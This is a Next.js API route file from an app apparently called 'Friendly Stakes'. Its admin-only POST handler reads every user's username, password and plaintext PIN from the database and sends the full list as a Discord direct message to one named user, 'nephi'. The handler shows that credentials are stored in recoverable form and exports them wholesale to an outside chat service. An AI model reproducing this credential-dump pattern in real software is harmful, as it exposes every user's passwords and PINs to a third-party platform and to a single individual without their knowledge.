import { NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { getCurrentUser } from "@/lib/auth";
import { notifyDiscord } from "@/lib/discordNotify";

export async function POST() {
  const user = await getCurrentUser();
  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  if (!user.isAdmin) return NextResponse.json({ error: "Admin only" }, { status: 403 });

  const nephi = await prisma.user.findUnique({
    where: { username: "nephi" },
    select: { discordUserId: true },
  });

  if (!nephi?.discordUserId) {
    return NextResponse.json({ error: "Nephi has no Discord ID linked." }, { status: 400 });
  }

  const users = await prisma.user.findMany({
    orderBy: { username: "asc" },
    select: { username: true, password: true, pinPlain: true },
  });

  const lines = users.map((u) => `**${u.username}** — password: \`${u.password || "(not set)"}\` | PIN: \`${u.pinPlain}\``);
  const message = `🔐 **Friendly Stakes — Password List**\n${new Date().toLocaleString("en-US")}\n\n${lines.join("\n")}`;

  await notifyDiscord(nephi.discordUserId, message);

  return NextResponse.json({ ok: true, userCount: users.length });
}
